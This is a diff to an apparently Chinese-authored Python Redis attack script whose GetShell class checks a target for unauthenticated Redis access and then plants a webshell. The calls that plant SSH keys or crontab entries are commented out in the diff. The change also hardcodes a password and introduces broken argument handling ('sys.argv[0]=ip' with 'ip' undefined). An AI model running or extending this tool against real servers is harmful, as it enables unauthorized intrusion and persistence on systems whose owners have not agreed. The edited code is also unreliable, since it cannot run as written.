@@ -3,6 +3,7 @@
 # __author__ = "JrXnm"
 # Date: 18-9-20
 
+import sys
 import redis
 from redis.exceptions import *
 import requests
@@ -15,7 +16,7 @@ from config import webroot, config
 
 class GetShell(object):
     def __init__(self, host, port=6379):
-        self.conn = redis.Redis(host=host, port=port, decode_responses=True)
+        self.conn = redis.Redis(host=host, password='123456',port=port, decode_responses=True)
         self.host = host
         self.port = port
 
@@ -130,14 +131,15 @@ class GetShell(object):
 
 
 if __name__ == '__main__':
-    w = GetShell('192.168.246.129')
+    sys.argv[0]=ip
+    w = GetShell(ip)
     check1 = w.checkauth()
     if not check1[0]:
         print('[-]不存在未授权访问，测试结束。')
     else:
         w.getwebshell()
-        w.getssh()
-        w.getcrontab()
+#        w.getssh()
+#        w.getcrontab()
 
 
 
